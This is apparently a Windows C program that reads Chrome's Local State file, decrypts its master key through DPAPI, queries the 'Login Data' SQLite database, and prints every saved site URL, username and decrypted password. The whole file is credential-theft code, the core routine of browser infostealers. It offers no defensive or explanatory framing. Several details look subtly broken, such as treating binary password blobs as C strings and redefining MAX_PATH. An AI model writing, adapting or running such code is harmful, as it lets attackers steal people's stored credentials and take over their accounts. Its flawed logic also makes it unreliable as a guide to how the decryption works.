#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wincrypt.h>
#include <sqlite3.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/buffer.h> 


#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "sqlite3.lib")

#define MAX_PATH 260
#define KEY_LENGTH 32
#define IV_LENGTH 12

typedef struct {
    unsigned char key[KEY_LENGTH];
    unsigned char iv[IV_LENGTH];
} DecryptionContext;


char* extract_encrypted_key_from_json(const char* json_str) {
    const char* key_start = strstr(json_str, "\"encrypted_key\":");
    if (!key_start) return NULL;

    key_start = strchr(key_start, '\"');
    if (!key_start) return NULL;
    key_start++; 

    const char* key_end = strchr(key_start, '\"');
    if (!key_end) return NULL;

    size_t key_len = key_end - key_start;
    char* encrypted_key = malloc(key_len + 1);
    if (!encrypted_key) return NULL;

    strncpy(encrypted_key, key_start, key_len);
    encrypted_key[key_len] = '\0';

    return encrypted_key;
}


int read_local_state_file(char* local_state_path, char** encrypted_key) {
    FILE* file = fopen(local_state_path, "rb");
    if (!file) {
        fprintf(stderr, "Could not open Local State file\n");
        return 0;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    char* buffer = malloc(file_size + 1);
    if (!buffer) {
        fclose(file);
        return 0;
    }

    size_t read_size = fread(buffer, 1, file_size, file);
    buffer[read_size] = '\0';

    *encrypted_key = extract_encrypted_key_from_json(buffer);

    free(buffer);
    fclose(file);

    return *encrypted_key != NULL;
}

// Base64 decoding (using OpenSSL)
int base64_decode(const char* input, unsigned char** output, size_t* output_len) {
    BIO *bio, *b64;
    size_t input_len = strlen(input);
    *output = malloc(input_len);
    
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new_mem_buf(input, input_len);
    bio = BIO_push(b64, bio);
    
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    *output_len = BIO_read(bio, *output, input_len);
    
    BIO_free_all(bio);
    return *output_len > 0;
}


BOOL dpapi_decrypt(const unsigned char* encrypted_data, size_t encrypted_len, 
                   unsigned char* decrypted_data, size_t* decrypted_len) {
    DATA_BLOB dataIn = { encrypted_len, (BYTE*)encrypted_data };
    DATA_BLOB dataOut = { 0, NULL };
   
    if (!CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
        DWORD error = GetLastError();
        fprintf(stderr, "DPAPI Decryption failed. Error code: %lu\n", error);
        return FALSE;
    }
   
    *decrypted_len = dataOut.cbData;
    memcpy(decrypted_data, dataOut.pbData, dataOut.cbData);
    LocalFree(dataOut.pbData);
    return TRUE;
}


DecryptionContext* get_chrome_decryption_key() {
    char local_state_path[MAX_PATH];
    char userProfile[MAX_PATH];

    if (!GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile))) {
        fprintf(stderr, "Could not get user profile\n");
        return NULL;
    }

    snprintf(local_state_path, sizeof(local_state_path), 
             "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", userProfile);

    char* base64_encrypted_key = NULL;
    if (!read_local_state_file(local_state_path, &base64_encrypted_key)) {
        fprintf(stderr, "Failed to read encrypted key\n");
        return NULL;
    }

    unsigned char* encrypted_key = (unsigned char*)base64_encrypted_key + 5;

    unsigned char* decoded_key = NULL;
    size_t decoded_key_len;
    if (!base64_decode((const char*)encrypted_key, &decoded_key, &decoded_key_len)) {
        fprintf(stderr, "Base64 decoding failed\n");
        free(base64_encrypted_key);
        return NULL;
    }

    DecryptionContext* ctx = malloc(sizeof(DecryptionContext));
    size_t master_key_len;
    if (!dpapi_decrypt(decoded_key, decoded_key_len, ctx->key, &master_key_len)) {
        fprintf(stderr, "Master key decryption failed\n");
        free(decoded_key);
        free(base64_encrypted_key);
        free(ctx);
        return NULL;
    }

    memcpy(ctx->iv, ctx->key, IV_LENGTH);

    free(decoded_key);
    free(base64_encrypted_key);

    return ctx;
}


char* decrypt_chrome_password(const unsigned char* encrypted_data, size_t encrypted_len) {
    DecryptionContext* ctx = get_chrome_decryption_key();
    if (!ctx) {
        fprintf(stderr, "Failed to get decryption context\n");
        return NULL;
    }

    if (encrypted_len <= 3 || strncmp((const char*)encrypted_data, "v10", 3) != 0) {
        fprintf(stderr, "Invalid password format\n");
        free(ctx);
        return NULL;
    }

    encrypted_data += 3;
    encrypted_len -= 3;

    unsigned char iv[IV_LENGTH];
    memcpy(iv, encrypted_data, IV_LENGTH);
    encrypted_data += IV_LENGTH;          // Move past IV
    encrypted_len -= IV_LENGTH;          

    EVP_CIPHER_CTX* dec_ctx = EVP_CIPHER_CTX_new();
    unsigned char* plaintext = malloc(encrypted_len + 1); 
    int len = 0, plaintext_len = 0;

    if (!plaintext) {
        free(ctx);
        return NULL;
    }

    EVP_DecryptInit_ex(dec_ctx, EVP_aes_256_gcm(), NULL, ctx->key, iv);
    EVP_DecryptUpdate(dec_ctx, plaintext, &len, encrypted_data, encrypted_len);
    plaintext_len += len;

    if (EVP_DecryptFinal_ex(dec_ctx, plaintext + plaintext_len, &len) <= 0) {
        fprintf(stderr, "Decryption failed\n");
        EVP_CIPHER_CTX_free(dec_ctx);
        free(plaintext);
        free(ctx);
        return NULL;
    }

    plaintext_len += len;
    plaintext[plaintext_len] = '\0'; 

    EVP_CIPHER_CTX_free(dec_ctx);
    free(ctx);

    return (char*)plaintext;
}



int callback(void *data, int argc, char **argv, char **azColName) {
    printf("\n");
    for (int i = 0; i < argc; i++) {
        if (strcmp(azColName[i], "password_value") == 0 && argv[i] != NULL) {
            char* decrypted_password = decrypt_chrome_password(
                (unsigned char*)argv[i], 
                strlen(argv[i])
            );

            if (decrypted_password) {
                printf("Decrypted Password: %s\n", decrypted_password);
                free(decrypted_password);
            } else {
                printf("Password: [Decryption Failed]\n");
            }
        } else if (strcmp(azColName[i], "username_value") == 0) {
            printf("Username: %s\n", argv[i] ? argv[i] : "NULL");
        } else if (strcmp(azColName[i], "origin_url") == 0) {
            printf("URL: %s\n", argv[i] ? argv[i] : "NULL");
        }
    }
    return 0;
}

void FetchSavedPasswords(const char* dbPath) {
    sqlite3 *db;
    char *zErrMsg = 0;
    int rc;

    rc = sqlite3_open(dbPath, &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return;
    }

    const char *sql = "SELECT origin_url, username_value, password_value FROM logins";
   
    rc = sqlite3_exec(db, sql, callback, 0, &zErrMsg);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
    }

    sqlite3_close(db);
}

void GetChromeLoginDataPath(char *dbPath, size_t bufferSize) {
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) > 0) {
        snprintf(dbPath, bufferSize, 
                 "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", 
                 userProfile);
    } else {
        fprintf(stderr, "Error retrieving user profile directory.\n");
        dbPath[0] = '\0';  
    }
}

int main() {
    char dbPath[MAX_PATH];
    GetChromeLoginDataPath(dbPath, sizeof(dbPath));
   
    if (dbPath[0] == '\0') {
        fprintf(stderr, "Failed to retrieve Chrome Login Data path. Exiting.\n");
        return 1;
    }

    printf("Analyzing local password database: %s\n", dbPath);
    FetchSavedPasswords(dbPath);

    printf("\nPress Enter to exit...");
    getchar();
    return 0;
}